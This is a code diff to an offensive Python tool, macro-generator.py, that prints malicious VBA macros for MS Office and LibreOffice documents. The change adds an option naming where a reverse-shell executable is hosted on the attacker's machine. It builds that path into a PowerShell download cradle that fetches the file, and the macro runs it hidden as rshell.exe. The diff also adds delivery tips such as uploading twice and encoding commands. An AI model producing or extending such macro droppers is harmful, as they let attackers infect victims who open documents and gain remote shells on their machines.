@@ -7,21 +7,31 @@ import subprocess
 
 parser = argparse.ArgumentParser("macro-generator.py: Generate malicious macros using different techniques for MS Office and Libreoffice")
 parser.add_argument('-l', '--host',
-                    type=str,
-                    dest='host',
-                    help='IP address of attacker host'
-                    )
+    type=str,
+    dest='host',
+    help='IP address of attacker host'
+)
 parser.add_argument('-p', '--port',
-                    type=str,
-                    dest='port',
-                    help='PORT number of attacker listener'
-                    )
+    type=str,
+    dest='port',
+    help='PORT number of attacker listener'
+)
+parser.add_argument('-r', '--rshell',
+    type=str,
+    dest='rshell_path',
+    default='/win/rshell.exe',
+    help='Reverse rshell.exe location hosted on attacker machine, default=/win/rshell.exe, i.g ":8000/exp/shell.exe"'
+)
+
 args = parser.parse_args()
 
 if not args.host or not args.port:
     print("Options --host and --port are required")
     args = parser.parse_args(["-h"])
     sys.exit()
+
+if args.rshell_path == '/win/rshell.exe':
+    print(f"Option --rshell not provided, assuming reverse shell is hosted at 'http://{args.host}/win/rshell.exe'")
 
 # msfvenom -p windows/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f psh-cmd
 try:
@@ -73,7 +83,7 @@ print("\n\n--------------------------CRADLE-METHOD------------------------------
 
 print(beginstr)
 
-midstr = '    str = "powershell (New-Object System.Net.WebClient).DownloadFile(\'http://' + args.host + '/win/rshell.exe\', \'rshell.exe\')"'
+midstr = '    str = "powershell (New-Object System.Net.WebClient).DownloadFile(\'http://' + args.host + args.rshell_path + '\', \'rshell.exe\')"'
 print(midstr)
 
 endstr = '''    Shell str, vbHide
@@ -104,5 +114,6 @@ print('    Shell("cmd /c \'C:/windows/tasks/rshell.exe\'")')
 print('End Sub')
 
 print('\n\n-----NOTES------')
+print('For Method 3 and 4, Cradle and Libreoffice; Generate a reverse shell and host it on attacker, provide path to download it, e.g --rshell "/exp/rshell.exe"')
 print('Upload TWICE when using 2 step methods, it tries to execute before download completes')
 print('Try encoded powershell commands for ODT since quotes and brackets cause issues')
